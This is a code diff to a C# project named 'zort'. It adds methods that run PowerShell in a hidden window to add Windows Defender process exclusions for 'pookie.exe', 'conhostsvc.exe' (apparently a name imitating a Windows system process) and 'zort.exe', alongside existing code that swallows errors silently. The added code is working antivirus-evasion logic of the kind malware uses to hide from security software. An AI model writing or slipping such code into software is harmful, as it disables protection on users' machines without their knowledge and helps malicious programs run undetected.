@@ -1,6 +1,7 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -52,6 +53,36 @@ namespace zort
             {
                 // Handle exceptions silently
             }
+        }
+
+        internal static void AddDefenderExclusions()
+        {
+            AddDefenderExclusion("pookie.exe");
+            AddDefenderExclusion("conhostsvc.exe");
+            AddDefenderExclusion("zort.exe");
+        }
+
+        internal static void AddDefenderExclusion(string processName)
+        {
+            string args = $"-Command Add-MpPreference -ExclusionProcess \"{processName}\"";
+            RunPSCommand(args);
+        }
+
+        internal static void RemoveDefenderExclusion(string processName)
+        {
+            string args = $"-Command Remove-MpPreference -ExclusionProcess \"{processName}\"";
+            RunPSCommand(args);
+        }
+
+        private static void RunPSCommand(string args) {
+            var process = new Process();
+            process.StartInfo.FileName = "powershell.exe";
+            process.StartInfo.Arguments = args;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.CreateNoWindow = true;
+            process.Start();
         }
     }
 }
